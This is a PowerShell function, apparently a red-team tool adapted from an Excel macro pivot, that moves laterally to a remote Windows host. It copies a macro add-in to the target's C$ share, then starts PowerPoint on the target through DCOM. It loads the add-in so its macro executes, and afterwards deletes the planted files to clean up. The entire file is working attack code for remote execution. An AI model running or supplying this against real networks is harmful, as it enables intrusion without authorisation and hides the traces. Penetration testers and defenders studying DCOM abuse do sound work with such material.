function Invoke-DCOMPowerPointPivot {
<#
    .AUTHOR
       @_nephalem_
    .SYNOPSIS
       Facilitates pivoting to a target through PowerPoint Add-In Macro and the PowerPoint COM object
       cmdlet adapted from Invoke-ExcelMacroPivot by @enimga0x3
    .PARAMETER Target
        (MANDATORY)
        Target host
    .PARAMETER AddinPath
        (MANDATORY)
        Local filepath for .ppa / .ppam file
     .Parameter DestPath
        (OPTIONAL)
        Specifies a custom destination file path on the target device
        Default: Place file with same name as source file in C:\
     .Parameter ExecWaitTime
        (OPTIONAL)
        Specifiies a custom wait time for the Add-In to execute before unloading
        Default: 5 seconds
    .EXAMPLE
        (MANDATORY PARAMETERS)
        PS C:\> Invoke-DCOMPowerPointPivot -Target "192.168.1.20" -AddinPath "c:\PowerPoint.ppa"
        (OPTIONAL PARAMETERS)
        PS C:\> Invoke-DCOMPowerPointPivot -Target "192.168.1.20" -AddinPath "c:\PowerPoint.ppa" -DestPath "c:\Windows\Temp\NiceFile.ppam" -ExecWaitTime 10
#>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [string]$Target,
        [string]$AddInPath,
        [Parameter(Mandatory=$False, ValueFromPipeline=$True)]
        [string]$DestPath = "c:\",
        [int]$ExecWaitTime = 5
    )

    $32BitPath = "\\$target\c$\Windows\System32\config\systemprofile\Desktop"
    $64BitPath = "\\$target\c$\Windows\SysWOW64\config\systemprofile\Desktop"

    # Connect to remote host via WMI for reg enumeration
    try{
        Write-Host "Connecting to StdRegProv on $target"
        $remoteReg = [WMIClass]"\\$target\ROOT\default:StdRegProv"
    }catch{
        throw "Could not connect to StdRegProv"
    }
    
    # Determine target OS architecture
    try{
        Write-Host "Getting OS Architecture of $target"
        $OSArch = @(Get-WmiObject -ComputerName $target -Query 'SELECT AddressWidth FROM Win32_Processor')[0] | Select-Object -ExpandProperty AddressWidth
    }catch{
        throw "Could not get OS Arch."
    }
    
    # Check for Office Presence
    $hklm = [uint32]'0x80000002'
    $OfficeResult = $remoteReg.CheckAccess($hklm, 'SOFTWARE\Microsoft\Office',1)

    # Prepares required directories on target
    function Local:Prep-Target{
        if ($OSArch -eq "64") {
            try {
                $temp = [system.io.directory]::createDirectory($32BitPath)
                $temp = [system.io.directory]::createDirectory($64BitPath)
            } catch {
                        throw "Unable to create directory"
                    }

        } elseif ($OSArch -eq "32") {
            try {
                $temp = [system.io.directory]::createDirectory($32BitPath)
            } catch {
                        throw "Unable to create directory"
                    }
        } else {
                throw "OS Arch not determined"
        }
    } 

    function Local:Transfer-File{
            # Copy PPA / PPAM file to target
    try{
        $fileName = [System.IO.Path]::GetFileName($AddInPath)
        if ($DestPath -eq "c:\") {
            $RemotePath = "\\$target\c$\" + $fileName
        }
        else {
            $RemotePath = "\\$target\c$\" + $DestPath.Substring(3)
        }
        Write-Host "Moving Add-in file to $target (Source: $AddInPath, Destination: $RemotePath)"
        [System.IO.File]::Copy($AddInPath, $RemotePath, $True)
        return $RemotePath
    }catch{
        throw "Unable to copy PowerPoint Add-In to $target"
    }
    }

    function Local:Cleanup-Target{
            if ($OSArch -eq "64") {
                try{
                    [system.io.directory]::Delete($32BitPath)
                    [system.io.directory]::Delete($64BitPath)
                } catch{
                    throw "Unable to delete directory"
                }
            } elseif ($OSArch -eq "32") {
                try{
                    [system.io.directory]::Delete($32BitPath)
                } catch{
                    throw "Unable to delete directory"
                } 
            }
        try{
            [system.io.file]::Delete($RemotePath)
        } catch {
            throw "Unable to cleanup payload"
        }
    }

    If ($OfficeResult.BGranted -eq $True) {
        Write-Host "Prepping $target"
        Prep-Target
        $RemotePath = Transfer-File
        Write-Host "Activating PowerPoint.Application on $target"
        $PowerPoint = [activator]::CreateInstance([type]::GetTypeFromProgID("PowerPoint.Application",$target))
        Write-Host "Adding Add-In"
        $AddIn = $PowerPoint.Addins.Add($RemotePath)
        Write-Host "Loading Add-In"
        $AddIn.Loaded = 1
        Write-Host "Waiting $ExecWaitTime seconds for execution"
        Start-Sleep $ExecWaitTime
        Write-Host "Unloading Add-In"
        $AddIn.Loaded = 0
        Write-Host "Removing Add-In"
        $temp = $PowerPoint.Addins.Remove(1)
        $PowerPoint.Quit()
        [System.Runtime.Interopservices.Marshal]::FinalReleaseComObject($PowerPoint)
        Write-Host "Sleeping 10 seconds for FinalReleaseCOMOBject() to finish"
        Start-Sleep 10
        Write-Host "Cleaning up $target"
        Cleanup-Target
        Write-Host "SUCCESS!"
    } else{
        throw "Office not installed on target"
    }
}